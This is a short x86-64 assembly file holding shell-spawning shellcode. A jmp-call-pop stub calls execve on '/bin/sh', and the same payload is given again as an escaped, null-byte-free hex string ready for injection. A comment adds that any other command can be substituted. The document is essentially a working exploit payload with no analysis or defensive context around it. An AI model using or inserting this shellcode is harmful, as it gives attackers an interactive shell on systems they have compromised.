BITS 64
    GLOBAL _start
_start:
    jmp short .data

; a simple null-byte free execve(command,0,0) call
.text:
    pop rdi
    xor rsi, rsi
    xor rdx, rdx
    mov al, 0x3b
    syscall

.data:
    call .text
    db '/bin/sh', 0x00 ; can be any other command of course

; null-byte free shell spawning shellcode from the above snippet:
; \xeb\x0b\x5f\x48\x31\xf6\x48\x31\xd2\xb0\x3b\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68